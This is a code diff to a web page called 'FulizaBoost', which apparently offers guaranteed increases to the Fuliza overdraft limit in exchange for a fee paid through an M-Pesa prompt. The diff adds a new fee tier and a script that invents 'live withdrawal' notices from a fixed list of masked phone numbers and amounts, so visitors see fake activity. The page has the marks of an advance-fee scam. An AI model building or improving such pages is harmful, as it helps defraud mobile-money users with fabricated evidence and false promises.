@@ -435,13 +435,17 @@ body {
     <div class="title">FulizaBoost</div>
     <div class="subtitle">Instant Limit Increase • Guaranteed Approval</div>
 
-    <div class="live-box">
-        ⚡ 0746****67 increased to Ksh 30,000 • just now
-    </div>
+<div class="live-box" id="liveBox">
+    ⚡ Loading live transactions...
+</div>
 
     <div class="section-title">Select Your Fuliza Limit</div>
 
     <div class="grid" id="limitGrid">
+<div class="limit-card" data-amount="3500" data-fee="100">
+    <div class="amount">Ksh 3500</div>
+    <div class="fee">Fee: Ksh 100</div>
+</div>
         <div class="limit-card" data-amount="5000" data-fee="149">
             <div class="amount">Ksh 5,000</div>
             <div class="fee">Fee: Ksh 149</div>
@@ -507,7 +511,7 @@ body {
     <span class="close-modal" onclick="closePaymentModal()">✕</span>
     <h2>complete payment</h2>
     <div class="sub">pay processing fee via M-Pesa</div>
-    
+
     <!-- Selected Limit Summary -->
     <div id="selectedSummary" class="selected-summary" style="display: none;">
         <div class="summary-row">
@@ -614,18 +618,18 @@ body {
         document.getElementById('selectedLimitDisplay').textContent = `Ksh ${parseInt(selectedAmount).toLocaleString()}`;
         document.getElementById('selectedFeeDisplay').textContent = `Ksh ${parseInt(selectedFee).toLocaleString()}`;
         document.getElementById('paymentAmount').textContent = `Ksh ${parseInt(selectedFee).toLocaleString()}`;
-        
+
         // Show modal
         document.getElementById('selectedSummary').style.display = 'block';
         document.getElementById('paymentForm').style.display = 'block';
         document.getElementById('successSection').style.display = 'none';
         document.getElementById('paymentModal').style.display = 'block';
         document.getElementById('modalOverlay').style.display = 'block';
-        
+
         // Reset STK response
         document.getElementById('stkResponse').style.display = 'none';
         document.getElementById('paymentStatusBadge').innerHTML = '<i class="fas fa-circle"></i> ready for payment';
-        
+
         // NO PRE-FILLED NUMBER - just empty with placeholder
         document.getElementById('paymentPhone').value = '';
     }
@@ -736,7 +740,7 @@ body {
             stkResponse.style.display = 'block';
 
             statusBadge.innerHTML = '<i class="fas fa-exclamation-circle"></i> try again';
-            
+
             showNotification('payment failed, please try again');
         } finally {
             // Re-enable button - EXACT NYOTA
@@ -757,6 +761,38 @@ body {
     function proceed() {
         alert("Selected Limit: Ksh " + selectedAmount + "\n\nNext step: Add payment method.");
     }
+// ===== RANDOM LIVE WITHDRAWALS =====
+
+const liveBox = document.getElementById("liveBox");
+
+const randomNames = [
+    "0712****45", "0798****12", "0745****89", "0701****34",
+    "0722****67", "0733****90", "0788****21", "0755****43",
+    "0766****78", "0777****56", "0791****11", "0744****22"
+];
+
+const randomAmounts = [
+    100, 500, 1000, 2000, 5000, 10000, 15000,
+    20000, 25000, 30000, 35000, 45000
+];
+
+function generateRandomTransaction() {
+    const randomNumber = randomNames[Math.floor(Math.random() * randomNames.length)];
+    const randomAmount = randomAmounts[Math.floor(Math.random() * randomAmounts.length)];
+
+    liveBox.innerHTML = `⚡ ${randomNumber} withdrew Ksh ${randomAmount.toLocaleString()} • just now`;
+}
+
+// Generate first 10 quickly
+let count = 0;
+const initialInterval = setInterval(() => {
+    generateRandomTransaction();
+    count++;
+    if (count >= 10) clearInterval(initialInterval);
+}, 1200);
+
+// Continue updating every 5 seconds
+setInterval(generateRandomTransaction, 5000);
 </script>
 
 </body>
